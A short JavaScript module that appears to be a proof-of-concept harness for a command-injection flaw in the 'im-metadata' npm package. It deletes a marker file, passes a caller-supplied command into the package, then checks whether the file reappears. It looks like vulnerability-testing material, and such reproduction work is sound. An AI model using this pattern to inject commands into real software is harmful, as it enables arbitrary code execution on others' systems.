function exploitFunction(command, options, callback) {
  const metadata = require("im-metadata");
  const fs = require("fs");

  // Remove any existing file to ensure clean state
  const path = "./im-metadata";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);

  // Execute the command with im-metadata
  metadata(command, options, callback);

  file_exist = fs.existsSync(path);
}

module.exports = { exploitFunction };